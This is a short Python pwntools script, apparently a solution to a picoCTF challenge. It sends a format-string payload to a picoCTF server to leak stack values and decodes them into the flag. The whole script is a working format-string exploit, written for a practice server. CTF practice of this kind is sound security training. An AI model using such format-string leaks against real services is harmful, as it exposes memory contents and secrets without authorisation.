from pwn import *

context.log_level = "debug"
# r = process("./vuln")
r = remote("saturn.picoctf.net", 54209)
exe = ELF("./vuln")
# My method is a little bit ugly, but I like it because it works :)
r.recvuntil(b">> ")
r.sendline(b"%36$p.%37$p.%38$p.%39$p.%40$p.%41$p.%42$p.%43$p.%44$p.%45$p.")
r.recvline()
flag_hex = r.recvline().decode().split(".")
for i in flag_hex:
    print(bytes.fromhex(i[2:]).decode()[::-1], end="")
